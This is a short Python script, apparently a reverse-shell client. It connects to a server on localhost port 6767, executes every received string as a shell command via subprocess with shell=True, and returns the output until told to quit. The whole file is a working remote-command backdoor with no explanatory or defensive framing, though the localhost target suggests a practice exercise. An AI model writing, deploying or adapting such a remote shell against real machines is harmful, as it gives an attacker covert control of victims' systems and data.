#stephan

import socket
import sys
import subprocess
import threading

HOST = 'localhost'
PORT = 6767

# create socket
client = socket.socket()
client.connect((HOST, PORT))

msg = client.recv(10240).decode()
print(f'[*] server:',msg)


def startProcess(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True)
    except Exception as error:
        errMessage = str(error).encode()
        client.send(errMessage)
        client.close()

    if result.returncode == 0:
        if len(result.stdout.decode()) != 0:
            client.send(result.stdout)
        else:
            client.send('Process Started'.encode())
    else:
        client.send('[+] Command Error!'.encode())

while True:
    cmd = client.recv(10240).decode()
    print(f'[+]command: {cmd}') 
    if cmd.lower() in ['q', 'quit', 'exit', 'x']:
        break
    t1 = threading.Thread(target=startProcess, args=(cmd,))
    t1.run()

client.close()